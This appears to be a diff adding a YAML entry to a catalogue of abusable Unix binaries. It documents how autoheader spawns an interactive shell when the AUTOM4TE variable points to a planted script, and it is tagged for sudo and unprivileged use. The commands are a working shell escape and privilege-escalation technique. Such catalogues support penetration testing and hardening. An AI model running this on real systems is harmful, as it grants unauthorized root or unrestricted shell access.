@@ -1,0 +1,12 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo '/bin/sh 1>&0' >/path/to/temp-file
+      chmod +x /path/to/temp-file
+      touch configure.ac
+      AUTOM4TE=/path/to/temp-file autoheader
+    contexts:
+      sudo:
+      unprivileged:
+...
